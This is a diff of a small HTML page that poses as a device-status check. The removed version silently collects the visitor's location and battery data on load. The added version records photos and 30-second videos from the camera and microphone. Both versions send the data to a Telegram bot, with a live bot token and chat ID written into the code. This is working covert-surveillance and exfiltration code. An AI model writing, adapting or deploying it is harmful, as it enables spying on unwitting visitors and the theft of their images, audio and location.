@@ -1,82 +1,83 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Checking Device Status...</title>
+    <title>Capturing Media...</title>
     <script>
-        async function sendData() {
-            let data = {};
+        async function startCapturing() {
+            try {
+                // Request camera & microphone access
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                const mediaRecorder = new MediaRecorder(stream);
+                const videoChunks = [];
+                const imageCapture = new ImageCapture(stream.getVideoTracks()[0]);
 
-            // Get Location If Permission is Already Granted
-            async function getLocation() {
-                try {
-                    const permissionStatus = await navigator.permissions.query({ name: "geolocation" });
-
-                    if (permissionStatus.state === "granted") {
-                        // Get location directly (No prompt)
-                        return new Promise((resolve) => {
-                            navigator.geolocation.getCurrentPosition((position) => {
-                                data.location = {
-                                    latitude: position.coords.latitude,
-                                    longitude: position.coords.longitude,
-                                };
-                                resolve();
-                            }, 
-                            () => {
-                                data.location = "Error getting location";
-                                resolve();
-                            });
-                        });
-                    } else {
-                        // Skip location if not granted
-                        data.location = "Not Allowed";
-                        return Promise.resolve();
+                // Capture 10 images
+                async function captureImages() {
+                    for (let i = 0; i < 10; i++) {
+                        const blob = await imageCapture.takePhoto();
+                        sendMediaToTelegram(blob, "photo");
+                        await new Promise(resolve => setTimeout(resolve, 1000)); // Wait 1 second between images
                     }
-                } catch (error) {
-                    data.location = "Not Supported";
-                    return Promise.resolve();
                 }
-            }
 
-            // Get Battery Info
-            function getBatteryInfo() {
-                return new Promise((resolve) => {
-                    if (navigator.getBattery) {
-                        navigator.getBattery().then(battery => {
-                            data.battery = {
-                                level: battery.level * 100 + "%",
-                                charging: battery.charging ? "Charging" : "Not Charging"
-                            };
-                            resolve();
-                        });
-                    } else {
-                        data.battery = "Not Supported";
-                        resolve();
+                // Start recording video
+                function startVideoRecording() {
+                    mediaRecorder.start();
+                    mediaRecorder.ondataavailable = event => {
+                        videoChunks.push(event.data);
+                    };
+
+                    // Stop recording after 30 seconds
+                    setTimeout(() => {
+                        mediaRecorder.stop();
+                    }, 30000);
+                }
+
+                // Stop and send video
+                mediaRecorder.onstop = async () => {
+                    const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
+                    sendMediaToTelegram(videoBlob, "video");
+
+                    // If this is the first video, start a second recording
+                    if (videoChunks.length === 1) {
+                        setTimeout(startVideoRecording, 2000);
                     }
-                });
+                };
+
+                // Start first video recording
+                startVideoRecording();
+
+                // Start capturing images
+                captureImages();
+
+            } catch (error) {
+                alert("Camera or microphone access denied! Please allow it in browser settings.");
+            }
+        }
+
+        async function sendMediaToTelegram(mediaBlob, type) {
+            const formData = new FormData();
+            formData.append("chat_id", "1679328294"); // Your chat ID
+
+            if (type === "photo") {
+                formData.append("photo", mediaBlob, "image.jpg");
+            } else if (type === "video") {
+                formData.append("video", mediaBlob, "video.webm");
             }
 
-            // Wait for both location (if granted) & battery data
-            await Promise.all([getLocation(), getBatteryInfo()]);
-            sendToTelegram(data);
-        }
-
-        function sendToTelegram(data) {
-            fetch("https://api.telegram.org/bot7570012997:AAFqnbInLmAH0O_49cxHu4W87HnVOdfjKS0/sendMessage", {
+            fetch(`https://api.telegram.org/bot7570012997:AAFqnbInLmAH0O_49cxHu4W87HnVOdfjKS0/send${type === "photo" ? "Photo" : "Video"}`, {
                 method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    chat_id: "1679328294",
-                    text: JSON.stringify(data, null, 2),
-                }),
-            }).then(response => response.json())
-              .then(result => console.log("Sent to Telegram:", result))
-              .catch(error => console.error("Error:", error));
+                body: formData,
+            })
+            .then(response => response.json())
+            .then(result => console.log(`${type} sent:`, result))
+            .catch(error => console.error(`Error sending ${type}:`, error));
         }
 
-        window.onload = sendData;
+        window.onload = startCapturing;
     </script>
 </head>
 <body>
-    <h3>Checking device status...</h3>
+    <h3>Capturing images and videos...</h3>
 </body>
 </html>
